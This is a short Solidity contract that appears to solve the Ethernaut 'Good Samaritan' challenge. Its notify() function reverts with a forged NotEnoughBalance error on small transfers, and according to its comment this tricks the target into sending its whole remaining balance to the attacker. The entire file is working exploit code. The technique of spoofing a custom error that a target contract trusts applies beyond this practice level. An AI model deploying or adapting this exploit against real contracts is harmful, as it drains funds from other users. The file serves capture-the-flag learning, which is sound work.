// SPDX-License-Identifier: MIT
pragma solidity^0.8.17;

interface GoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}


contract GoodSamaritanExploit{

    error NotEnoughBalance();
    GoodSamaritan target;

    constructor(address _targetAddress){
        target = GoodSamaritan(_targetAddress);
    }

    function pwn() public {
        target.requestDonation();
    }

    function notify(uint amount) public pure{
        
        if(amount <= 10){
            //Only revert the initial tx with the error so we trigger transferRemainder() to us
            revert NotEnoughBalance();
        }
    }
}